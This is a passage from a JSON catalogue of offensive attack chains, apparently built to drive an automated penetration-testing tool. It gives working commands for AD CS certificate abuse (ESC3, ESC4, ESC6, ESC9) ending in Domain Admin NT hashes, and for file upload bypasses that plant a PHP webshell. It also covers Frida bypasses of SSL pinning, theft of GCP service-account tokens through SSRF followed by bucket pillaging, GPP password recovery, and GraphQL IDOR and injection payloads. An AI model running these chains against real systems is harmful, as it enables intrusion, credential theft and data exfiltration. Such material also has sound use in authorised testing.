          "name": "Request the agent certificate",
          "inline_command": "certipy req -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -ca '<ca>' -template '<agent_tpl>'",
          "requires": [
            "agent_template",
            "ca_name"
          ],
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "ca": "${ca_name}",
            "agent_tpl": "${agent_template}"
          },
          "capture": [
            {
              "var": "agent_pfx",
              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
              "match": "first"
            }
          ]
        },
        {
          "id": "use_agent_to_mint",
          "name": "Use agent cert to mint an Administrator certificate",
          "command_ref": "certipy-esc3",
          "requires": [
            "agent_pfx",
            "ca_name"
          ],
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "ca_name": "${ca_name}"
          },
          "notes": "Specify `-on-behalf-of '<domain>/administrator'` and `-pfx <agent_pfx>`\nto chain the requests. Resulting PFX authenticates as Administrator.\n",
          "capture": [
            {
              "var": "pfx_file",
              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
              "match": "first"
            }
          ]
        },
        {
          "id": "pkinit_auth",
          "name": "Authenticate as the impersonated identity",
          "command_ref": "certipy-auth",
          "requires": [
            "pfx_file"
          ],
          "inputs": {
            "pfx_file": "${pfx_file}",
            "ip": "${dc_ip}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
              "match": "first"
            }
          ]
        }
      ],
      "references": [
        {
          "title": "Certified Pre-Owned — ESC3",
          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "dc_nt_hash captured",
          "reason": "Golden Ticket persistence."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "dc_nt_hash captured",
          "reason": "Spread the recovered hash."
        }
      ]
    },
    {
      "id": "esc4-adcs-template-acl",
      "name": "ADCS ESC4 — vulnerable template ACL (modify-to-ESC1)",
      "description": "You have GenericAll / GenericWrite / WriteOwner / WriteDacl on a certificate template. Rewrite the template into an ESC1 configuration (ENROLLEE_SUPPLIES_SUBJECT + Client Auth EKU + low-priv enrollment), then exploit it as ESC1, then revert.\n",
      "tags": [
        "adcs",
        "esc4",
        "priv-esc",
        "certificates",
        "dacl-abuse",
        "active-directory"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "find_esc4",
          "name": "Find ESC4 templates (your principal has write rights)",
          "command_ref": "certipy-find",
          "inputs": {
            "ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Look for `Vulnerabilities: ESC4` plus your principal in `Permissions`\nwith `Full Control` or `Write`.\n",
          "capture": [
            {
              "var": "target_template",
              "regex": "Template Name\\s*:\\s*(\\S+)\\s*\\n[\\s\\S]*?Vulnerabilities[\\s\\S]*?ESC4",
              "match": "first"
            },
            {
              "var": "ca_name",
              "regex": "CA Name\\s*:\\s*(.+?)$",
              "match": "first"
            }
          ]
        },
        {
          "id": "save_original",
          "name": "Save the original template config (CRITICAL — for rollback)",
          "inline_command": "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -template '<tpl>' -save-old",
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "tpl": "${target_template}"
          },
          "notes": "`-save-old` writes the original ACL/EKUs to <tpl>.json. ALWAYS do\nthis before the next step — otherwise revert is painful.\n"
        },
        {
          "id": "rewrite_to_esc1",
          "name": "Rewrite template into an ESC1 configuration",
          "command_ref": "certipy-template",
          "requires": [
            "target_template"
          ],
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}"
          },
          "notes": "Default behavior (no `-configuration` arg) makes the template into\nthe canonical ESC1 form. Verify with certipy-find again — it should\nnow flag the template as ESC1 too.\n"
        },
        {
          "id": "exploit_as_esc1",
          "name": "Exploit as ESC1 → cert as Administrator",
          "command_ref": "certipy-esc1",
          "requires": [
            "target_template",
            "ca_name"
          ],
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "ca_name": "${ca_name}",
            "vulnerable_template": "${target_template}",
            "target_user": "administrator"
          },
          "capture": [
            {
              "var": "pfx_file",
              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
              "match": "first"
            }
          ]
        },
        {
          "id": "pkinit_auth",
          "name": "Authenticate via PKINIT → DA NT hash",
          "command_ref": "certipy-auth",
          "requires": [
            "pfx_file"
          ],
          "inputs": {
            "pfx_file": "${pfx_file}",
            "ip": "${dc_ip}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
              "match": "first"
            }
          ]
        },
        {
          "id": "restore_template",
          "name": "RESTORE template (re-apply -save-old config)",
          "inline_command": "certipy template -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> -template '<tpl>' -configuration <tpl>.json",
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "tpl": "${target_template}"
          },
          "notes": "Roll back the template. Polite for labs and stops anyone else from\nreusing your footing trick.\n"
        }
      ],
      "references": [
        {
          "title": "Certified Pre-Owned — ESC4",
          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "dc_nt_hash captured",
          "reason": "You hold the DA — persist via Golden Ticket."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "dc_nt_hash captured",
          "reason": "Spread the DA hash."
        }
      ]
    },
    {
      "id": "esc6-adcs-edituf-global",
      "name": "ADCS ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 global flag",
      "description": "The CA has the EDITF_ATTRIBUTESUBJECTALTNAME2 flag set globally → SAN attributes are accepted in any cert request, regardless of the template's ENROLLEE_SUPPLIES_SUBJECT setting. Every enrollable template becomes an ESC1 candidate.\n",
      "tags": [
        "adcs",
        "esc6",
        "priv-esc",
        "certificates"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "find_esc6",
          "name": "Confirm CA has the EDITF flag (certipy CA inspection)",
          "command_ref": "certipy-find",
          "inputs": {
            "ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Look at the CA section: `User Specified SAN: Enabled` and/or\n`Vulnerabilities: ESC6`. May 2022 patches set this to Disabled by\ndefault — affects mostly older / mis-configured deployments.\n",
          "capture": [
            {
              "var": "ca_name",
              "regex": "CA Name\\s*:\\s*(.+?)$",
              "match": "first"
            },
            {
              "var": "any_template",
              "regex": "Template Name\\s*:\\s*(\\S+)",
              "match": "first"
            }
          ]
        },
        {
          "id": "request_with_san",
          "name": "Request a cert with Administrator UPN in SAN (any template)",
          "command_ref": "certipy-esc6",
          "requires": [
            "ca_name",
            "any_template"
          ],
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "ca_name": "${ca_name}"
          },
          "notes": "Use ANY template you can enroll in — User, Machine, anything. The\nEDITF flag globally accepts your `-upn administrator@<domain>`.\n",
          "capture": [
            {
              "var": "pfx_file",
              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
              "match": "first"
            }
          ]
        },
        {
          "id": "pkinit_auth",
          "name": "PKINIT auth → Administrator NT hash",
          "command_ref": "certipy-auth",
          "requires": [
            "pfx_file"
          ],
          "inputs": {
            "pfx_file": "${pfx_file}",
            "ip": "${dc_ip}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
              "match": "first"
            }
          ]
        }
      ],
      "references": [
        {
          "title": "Certified Pre-Owned — ESC6",
          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "dc_nt_hash captured",
          "reason": "Golden Ticket."
        },
        {
          "chain": "pth-lateral-spread",
          "when": "dc_nt_hash captured",
          "reason": "Spread DA hash."
        }
      ]
    },
    {
      "id": "esc9-adcs-no-security-extension",
      "name": "ADCS ESC9 — no szOID_NTDS_CA_SECURITY_EXT (UPN remap)",
      "description": "Post-May-2022 patches added a Security Extension to certs that binds the cert to the requester's SID. When a template has `CT_FLAG_NO_SECURITY_EXTENSION` set (ESC9), this binding is missing — rename your account's UPN to Administrator, request a cert via that template, then PKINIT authenticates you as Administrator.\n",
      "tags": [
        "adcs",
        "esc9",
        "priv-esc",
        "certificates",
        "cve-2022-26931",
        "cve-2022-26923"
      ],
      "difficulty": "hard",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "domain",
          "source": "target_context.domain",
          "required": true
        },
        {
          "name": "user",
          "description": "Your principal (must have write rights on its own UPN — usually GenericWrite on itself or msDS-KeyCredentialLink).",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "find_esc9",
          "name": "Find ESC9 template",
          "command_ref": "certipy-find",
          "inputs": {
            "ip": "${dc_ip}",
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}"
          },
          "capture": [
            {
              "var": "vuln_template",
              "regex": "Template Name\\s*:\\s*(\\S+)\\s*\\n[\\s\\S]*?Vulnerabilities[\\s\\S]*?ESC9",
              "match": "first"
            },
            {
              "var": "ca_name",
              "regex": "CA Name\\s*:\\s*(.+?)$",
              "match": "first"
            }
          ]
        },
        {
          "id": "rename_upn",
          "name": "Set your account's UPN to administrator (write attribute)",
          "inline_command": "certipy account -u '<user>@<domain>' -p '<password>' -dc-ip <dc-ip> \\\n  -upn 'administrator' -user '<user>'\n",
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}"
          },
          "notes": "You need write rights on your own userPrincipalName. If you don't,\nuse shadow-credentials chain on yourself first, then add the agent\nKeyCredential to enable PKINIT-as-self.\n"
        },
        {
          "id": "request_cert",
          "name": "Request cert through the ESC9 template",
          "command_ref": "certipy-esc9",
          "requires": [
            "vuln_template",
            "ca_name"
          ],
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}",
            "ca_name": "${ca_name}",
            "vulnerable_template": "${vuln_template}"
          },
          "capture": [
            {
              "var": "pfx_file",
              "regex": "Saved certificate and private key to '(.+?\\.pfx)'",
              "match": "first"
            }
          ]
        },
        {
          "id": "restore_upn",
          "name": "Restore your real UPN",
          "inline_command": "certipy account -u 'administrator@<domain>' -p '<password>' -dc-ip <dc-ip> \\\n  -upn '<original_upn>' -user '<user>'\n",
          "inputs": {
            "domain": "${domain}",
            "user": "${user}",
            "password": "${password}",
            "dc-ip": "${dc_ip}"
          },
          "notes": "Restore your principal's original UPN — leaving it as\n'administrator' breaks the real admin's login and screams in logs.\n"
        },
        {
          "id": "pkinit_auth",
          "name": "Authenticate via PKINIT — server checks UPN at cert-issue time",
          "command_ref": "certipy-auth",
          "requires": [
            "pfx_file"
          ],
          "inputs": {
            "pfx_file": "${pfx_file}",
            "ip": "${dc_ip}"
          },
          "capture": [
            {
              "var": "dc_nt_hash",
              "regex": "(?:NT hash|Got hash for[^:]+):[^a-f0-9]*([a-f0-9]{32})",
              "match": "first"
            }
          ]
        }
      ],
      "references": [
        {
          "title": "Certipy 4 — ESC9/ESC10 deep-dive",
          "url": "https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7"
        }
      ],
      "next_chains": [
        {
          "chain": "ad-persistence-golden-ticket",
          "when": "dc_nt_hash captured",
          "reason": "Persist via Golden Ticket."
        }
      ]
    },
    {
      "id": "file-upload-bypass",
      "name": "Web → Shell — file upload bypass → webshell",
      "description": "Upload form with naive filtering. Try the standard tricks in order (extension blacklist → content-type → magic bytes → double extension → null-byte / .htaccess → polyglot) until one webshell lands and executes.\n",
      "tags": [
        "web",
        "file-upload",
        "webshell",
        "rce"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "upload_url",
          "description": "POST endpoint that accepts the upload.",
          "required": true
        },
        {
          "name": "served_path",
          "description": "Where uploaded files end up (e.g. /uploads/).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "bench_baseline",
          "name": "Baseline: upload a harmless file, see what's accepted",
          "inline_command": "curl -F 'file=@hello.txt' '<upload_url>'",
          "inputs": {
            "upload_url": "${upload_url}"
          }
        },
        {
          "id": "extension_swap",
          "name": "Try alternate PHP-handled extensions",
          "inline_command": "for ext in php php3 php5 phtml phar pht; do\n  cp shell.php \"shell.$ext\"\n  curl -F \"file=@shell.$ext\" \"<upload_url>\" | tail -3\ndone\n",
          "inputs": {
            "upload_url": "${upload_url}"
          },
          "notes": "Many blacklists block .php but not .phtml/.phar. JSP equivalents:\n.jsp, .jspx, .jsw, .jsv. ASP equivalents: .asp, .aspx, .ashx, .asmx,\n.config.\n"
        },
        {
          "id": "content_type_spoof",
          "name": "Force Content-Type: image/*",
          "inline_command": "curl -F 'file=@shell.php;type=image/png' '<upload_url>'",
          "inputs": {
            "upload_url": "${upload_url}"
          }
        },
        {
          "id": "magic_byte_prefix",
          "name": "Prefix with PNG magic bytes (polyglot)",
          "inline_command": "printf '\\\\x89PNG\\\\r\\\\n\\\\x1a\\\\n' > shell.png.php\ncat shell.php >> shell.png.php\ncurl -F 'file=@shell.png.php' '<upload_url>'\n",
          "inputs": {
            "upload_url": "${upload_url}"
          }
        },
        {
          "id": "htaccess_trick",
          "name": "If .htaccess writable: turn .jpg into PHP",
          "inline_command": "printf 'AddType application/x-httpd-php .jpg\\n' > .htaccess\ncurl -F 'file=@.htaccess' '<upload_url>'\ncurl -F 'file=@shell.jpg' '<upload_url>'   # now executes as PHP\n",
          "inputs": {
            "upload_url": "${upload_url}"
          }
        },
        {
          "id": "trigger",
          "name": "Hit the uploaded path",
          "inline_command": "curl '<served_path>/shell.php?cmd=id'",
          "inputs": {
            "served_path": "${served_path}"
          },
          "notes": "Drop a minimal one-liner webshell:\n  <?php system($_GET['cmd']); ?>\nThen escalate to a reverse shell with the rsg-* commands in the\npayloads category.\n"
        }
      ],
      "references": [
        {
          "title": "HackTricks — File Upload",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html"
        },
        {
          "title": "PayloadsAllTheThings — Upload Insecure Files",
          "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files"
        }
      ],
      "next_chains": [
        {
          "chain": "shell-stabilization",
          "when": "reverse shell received",
          "reason": "Stabilize."
        },
        {
          "chain": "linux-priv-esc-recon",
          "when": "shell on Linux",
          "reason": "Escalate from www-data."
        },
        {
          "chain": "windows-priv-esc-recon",
          "when": "shell on Windows IIS",
          "reason": "IIS AppPool → SeImpersonate path."
        }
      ]
    },
    {
      "id": "frida-android-hooking",
      "name": "Mobile — Android app reverse + Frida hook bypass",
      "description": "Pull the APK, decompile it, identify root/SSL-pinning/cert-bypass logic, hook the runtime with Frida to neutralize the checks, then proxy traffic through Burp to attack the API.\n",
      "tags": [
        "mobile",
        "android",
        "frida",
        "ssl-pinning",
        "reverse-engineering"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "package_name",
          "description": "App package id (e.g. com.target.app).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "pull_apk",
          "name": "Pull APK from a rooted/emulated device",
          "inline_command": "adb shell pm path <pkg>\n# → package:/data/app/.../base.apk\nadb pull /data/app/.../base.apk /tmp/target.apk\n",
          "inputs": {
            "pkg": "${package_name}"
          }
        },
        {
          "id": "decompile",
          "name": "Decompile with jadx / apktool",
          "inline_command": "jadx -d /tmp/target_src /tmp/target.apk\n# jadx-gui /tmp/target.apk  (for visual reading)\n# apktool d /tmp/target.apk -o /tmp/target_smali  (for resmoothing)\n"
        },
        {
          "id": "find_sensitive_strings",
          "name": "Grep for API endpoints, keys, pinning callbacks",
          "inline_command": "cd /tmp/target_src\ngrep -rn \"https://\" -- '*.java' | head\ngrep -rn \"BuildConfig\\.API_KEY\\|API_KEY\\|SECRET\\|TOKEN\" -- '*.java' | head\n# SSL pinning indicators:\ngrep -rn \"OkHttpClient\\|CertificatePinner\\|TrustManager\\|TrustKit\" -- '*.java' | head\n# Root checks:\ngrep -rn \"su\\|busybox\\|isDeviceRooted\\|RootBeer\\|SafetyNet\" -- '*.java' | head\n"
        },
        {
          "id": "install_frida_server",
          "name": "Push frida-server to the device (one-time)",
          "inline_command": "wget https://github.com/frida/frida/releases/latest/download/frida-server-16.0.0-android-arm64.xz -O /tmp/fs.xz\nxz -d /tmp/fs.xz\nadb push /tmp/fs /data/local/tmp/frida-server\nadb shell \"su -c 'chmod +x /data/local/tmp/frida-server && /data/local/tmp/frida-server &'\"\nfrida-ps -U  # confirm\n"
        },
        {
          "id": "bypass_ssl_pinning",
          "name": "Run universal SSL pinning bypass",
          "inline_command": "frida -U -l https://raw.githubusercontent.com/m0bilesecurity/RMS-Runtime-Mobile-Security/master/scripts/all-in-one-android-ssl-bypass.js -f <pkg>\n# Or use objection (interactive):\nobjection -g <pkg> explore\n# then: android sslpinning disable\n",
          "inputs": {
            "pkg": "${package_name}"
          }
        },
        {
          "id": "bypass_root_detection",
          "name": "Bypass root detection (if any)",
          "inline_command": "frida -U -l https://raw.githubusercontent.com/m0bilesecurity/RMS-Runtime-Mobile-Security/master/scripts/android-root-bypass.js -f <pkg>\n",
          "inputs": {
            "pkg": "${package_name}"
          }
        },
        {
          "id": "configure_proxy",
          "name": "Proxy traffic through Burp",
          "inline_command": "# Linux/Wi-Fi: set wifi proxy to <attacker_ip>:8080 in Android settings.\n# Or via adb (USB-tethered):\nadb shell settings put global http_proxy <attacker_ip>:8080\n# Install Burp's CA cert in user store (then move to system store on rooted device).\n"
        },
        {
          "id": "api_attack",
          "name": "Attack the API like any web app",
          "inline_command": "echo 'Now Burp/zap see all app traffic. Apply web attack chains: idor, sql-injection, jwt-attacks, csrf, etc.'"
        }
      ],
      "references": [
        {
          "title": "OWASP Mobile Testing Guide",
          "url": "https://owasp.org/www-project-mobile-app-security/"
        },
        {
          "title": "Frida docs",
          "url": "https://frida.re/docs/home/"
        }
      ],
      "next_chains": [
        {
          "chain": "jwt-attacks",
          "when": "API uses JWT",
          "reason": "Once you see the JWT in transit — attack it."
        },
        {
          "chain": "nosql-injection",
          "when": "API hits MongoDB-style backend",
          "reason": "Many mobile apps use document stores."
        }
      ]
    },
    {
      "id": "gcp-imds-metadata",
      "name": "Cloud — GCP IMDS → service-account token",
      "description": "SSRF on a GCP Compute instance reaches metadata.google.internal to steal the attached service account's OAuth2 token. Token's scopes determine reach (cloud-platform = full, devstorage = GCS only, etc.).\n",
      "tags": [
        "cloud",
        "gcp",
        "ssrf",
        "imds",
        "service-account"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "ssrf_url",
          "description": "Vulnerable URL that fetches arbitrary URLs.",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "confirm_gcp",
          "name": "Confirm we're on GCP (metadata index)",
          "inline_command": "curl '<url>http://metadata.google.internal/computeMetadata/v1/' \\\n  -H 'Metadata-Flavor: Google'\n# Alternative IPs: 169.254.169.254, metadata.google.internal, 100.100.100.200\n",
          "inputs": {
            "url": "${ssrf_url}"
          },
          "notes": "`Metadata-Flavor: Google` is REQUIRED. Same anti-SSRF mitigation as\nAzure — SSRFs without header injection are dead in the water.\n"
        },
        {
          "id": "enumerate_metadata",
          "name": "Enumerate identity + project + scopes",
          "inline_command": "curl '<url>http://metadata.google.internal/computeMetadata/v1/project/project-id' -H 'Metadata-Flavor: Google'\ncurl '<url>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/' -H 'Metadata-Flavor: Google'\ncurl '<url>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes' -H 'Metadata-Flavor: Google'\n",
          "inputs": {
            "url": "${ssrf_url}"
          },
          "capture": [
            {
              "var": "gcp_project",
              "regex": "^([a-z][a-z0-9-]+)$",
              "match": "first"
            },
            {
              "var": "gcp_sa_email",
              "regex": "([^/\\s]+@[^/\\s]+\\.iam\\.gserviceaccount\\.com)",
              "match": "first"
            }
          ]
        },
        {
          "id": "steal_token",
          "name": "Steal the OAuth2 access token",
          "inline_command": "curl '<url>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \\\n  -H 'Metadata-Flavor: Google'\n",
          "inputs": {
            "url": "${ssrf_url}"
          },
          "capture": [
            {
              "var": "gcp_access_token",
              "regex": "\"access_token\"\\s*:\\s*\"([^\"]+)\"",
              "match": "first"
            }
          ]
        },
        {
          "id": "enumerate_gcloud",
          "name": "Use the token with gcloud / curl",
          "inline_command": "export CLOUDSDK_AUTH_ACCESS_TOKEN='<token>'\ngcloud auth print-access-token\ngcloud projects list\ngcloud iam service-accounts list --project=<project>\n# Or raw API calls:\ncurl 'https://compute.googleapis.com/compute/v1/projects/<project>/zones?fields=items.name' \\\n  -H 'Authorization: Bearer <token>'\n",
          "inputs": {
            "token": "${gcp_access_token}",
            "project": "${gcp_project}"
          }
        },
        {
          "id": "bucket_pillage",
          "name": "Pillage GCS buckets (if scope allows)",
          "inline_command": "# List all buckets in the project:\ncurl 'https://storage.googleapis.com/storage/v1/b?project=<project>' \\\n  -H 'Authorization: Bearer <token>'\n# Read each bucket's contents:\ncurl 'https://storage.googleapis.com/storage/v1/b/<bucket>/o' \\\n  -H 'Authorization: Bearer <token>'\n# Download an object:\ncurl 'https://storage.googleapis.com/storage/v1/b/<bucket>/o/<object>?alt=media' \\\n  -H 'Authorization: Bearer <token>' -o file\n",
          "inputs": {
            "token": "${gcp_access_token}",
            "project": "${gcp_project}"
          }
        }
      ],
      "references": [
        {
          "title": "GCP metadata server docs",
          "url": "https://cloud.google.com/compute/docs/metadata/overview"
        },
        {
          "title": "HackTricks — GCP SSRF",
          "url": "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html"
        }
      ],
      "next_chains": [
        {
          "chain": "kubernetes-pod-escape",
          "when": "cluster GKE-hosted",
          "reason": "Many GCP boxes are GKE pods — same SSRF often reaches Kubernetes API."
        }
      ]
    },
    {
      "id": "gpp-cpassword-recovery",
      "name": "Cred Access — GPP cpassword recovery (MS14-025)",
      "description": "Pre-MS14-025 Group Policy Preferences stored encrypted passwords in SYSVOL with the AES key Microsoft accidentally published. Any authenticated user can read those XML files. Still a freebie on legacy AD networks.\n",
      "tags": [
        "credential-access",
        "gpp",
        "sysvol",
        "group-policy",
        "classic-windows"
      ],
      "difficulty": "easy",
      "inputs": [
        {
          "name": "dc_ip",
          "source": "target_context.ip",
          "required": true
        },
        {
          "name": "user",
          "source": "target_context.user",
          "required": true
        },
        {
          "name": "password",
          "source": "target_context.password"
        }
      ],
      "steps": [
        {
          "id": "search_gpp",
          "name": "Grep SYSVOL for cpassword XML",
          "command_ref": "nxc-smb-gpp-password",
          "inputs": {
            "ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "capture": [
            {
              "var": "gpp_cred",
              "regex": "(?:Found credentials|Decrypted password)[:\\s]+(.+)",
              "match": "first"
            }
          ]
        },
        {
          "id": "also_autologin",
          "name": "Check Registry-stored autologon creds (winlogon)",
          "command_ref": "nxc-smb-gpp-autologin",
          "inputs": {
            "ip": "${dc_ip}",
            "user": "${user}",
            "password": "${password}"
          },
          "notes": "Some Windows servers store DefaultPassword in HKLM\\Software\\Microsoft\\\nWindows NT\\CurrentVersion\\Winlogon. Still common on kiosks / RDP\njumpboxes.\n"
        },
        {
          "id": "validate",
          "name": "Validate the recovered credential",
          "inline_command": "nxc smb <ip> -u '<user>' -p '<found_pwd>'",
          "requires": [
            "gpp_cred"
          ],
          "inputs": {
            "ip": "${dc_ip}"
          },
          "notes": "GPP creds frequently belong to legacy admin accounts or scheduled-task\nservice users — usually Pwn3d! on multiple boxes.\n"
        }
      ],
      "references": [
        {
          "title": "MS14-025 GPP password disclosure",
          "url": "https://msrc.microsoft.com/update-guide/en-US/advisory/MS14-025"
        },
        {
          "title": "HackTricks — GPP",
          "url": "https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html"
        }
      ],
      "next_chains": [
        {
          "chain": "pth-lateral-spread",
          "when": "gpp_cred captured",
          "reason": "GPP creds usually grant local admin on many boxes."
        },
        {
          "chain": "dpapi-secrets-extraction",
          "when": "local admin via GPP",
          "reason": "Local admin → DPAPI dump."
        }
      ]
    },
    {
      "id": "graphql-introspection-injection",
      "name": "Web — GraphQL introspection + injection chain",
      "description": "GraphQL APIs frequently leave introspection enabled in production → full schema dump → discover mutations and sensitive query fields → IDOR / authorization bypass / injection on resolvers backed by SQL/NoSQL.\n",
      "tags": [
        "web",
        "graphql",
        "introspection",
        "idor",
        "injection"
      ],
      "difficulty": "medium",
      "inputs": [
        {
          "name": "target_url",
          "description": "GraphQL endpoint (usually /graphql, /api/graphql, /v1/graphql).",
          "required": true
        }
      ],
      "steps": [
        {
          "id": "detect_graphql",
          "name": "Confirm GraphQL endpoint",
          "inline_command": "curl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{__typename}\"}'\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Response `{\"data\":{\"__typename\":\"Query\"}}` → confirmed GraphQL.\nOther indicators: requests with `query`/`variables` in body, or\nApollo/Hasura/Postgraphile in response headers.\n"
        },
        {
          "id": "introspection_dump",
          "name": "Dump the full schema via introspection",
          "inline_command": "curl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d @<(echo '{\"query\":\"query IntrospectionQuery {__schema {queryType {name} mutationType {name} subscriptionType {name} types {...FullType} directives {name description locations args {...InputValue}}} } fragment FullType on __Type {kind name description fields(includeDeprecated: true) {name description args {...InputValue} type {...TypeRef} isDeprecated deprecationReason} inputFields {...InputValue} interfaces {...TypeRef} enumValues(includeDeprecated: true) {name description isDeprecated deprecationReason} possibleTypes {...TypeRef}} fragment InputValue on __InputValue {name description type {...TypeRef} defaultValue} fragment TypeRef on __Type {kind name ofType {kind name ofType {kind name ofType {kind name ofType {kind name ofType {kind name ofType {kind name ofType {kind name}}}}}}}}\"}')\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Save the response to schema.json. Use a UI like InQL (Burp plugin)\nor GraphQL Voyager to navigate visually. The killer fields are in\nMutation — they're the verbs (createUser, resetPassword, etc.).\n"
        },
        {
          "id": "clairvoyance_disabled",
          "name": "Introspection blocked? Try clairvoyance / field-suggestion brute",
          "inline_command": "pip install clairvoyance\nclairvoyance '<url>' -w /usr/share/wordlists/graphql/google-10000-english.txt -o schema.json\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "GraphQL returns helpful errors like \"Did you mean 'user'?\" — clairvoyance\nexploits that to rebuild the schema even with introspection off.\n"
        },
        {
          "id": "enumerate_queries",
          "name": "Enumerate sensitive queries (users, secrets, internal_*)",
          "inline_command": "curl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{ users { id email role passwordHash } }\"}'\ncurl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{ adminUsers { id email } }\"}'\ncurl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{ internalDebugInfo }\"}'\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Many GraphQL APIs forget per-field authorization. Even when /api/users\nchecks roles, the same fields exposed via GraphQL often don't.\n"
        },
        {
          "id": "idor_user_lookup",
          "name": "IDOR: fetch arbitrary user data",
          "inline_command": "for id in {1..100}; do\n  curl -s -X POST '<url>' -H 'Content-Type: application/json' \\\n    -d \"{\\\"query\\\":\\\"{ user(id: $id) { email passwordHash apiKey } }\\\"}\"\ndone\n",
          "inputs": {
            "url": "${target_url}"
          }
        },
        {
          "id": "mutation_takeover",
          "name": "Hit dangerous mutations (passwordReset / promoteUser)",
          "inline_command": "curl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"mutation { resetPassword(userId: 1, newPassword: \\\"pwn\\\") { token } }\"}'\n",
          "inputs": {
            "url": "${target_url}"
          },
          "notes": "Common forgotten authorization → admin mutations callable by any\nauthenticated (or even unauthenticated!) user.\n"
        },
        {
          "id": "nosql_injection_via_args",
          "name": "NoSQL / SQL injection on resolver arguments",
          "inline_command": "curl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{ user(id: \\\"1 OR 1=1--\\\") { email } }\"}'\ncurl -X POST '<url>' -H 'Content-Type: application/json' \\\n  -d '{\"query\":\"{ user(filter: {name: {$ne: \\\"\\\"}}) { email } }\"}'\n",
          "inputs": {
            "url": "${target_url}"
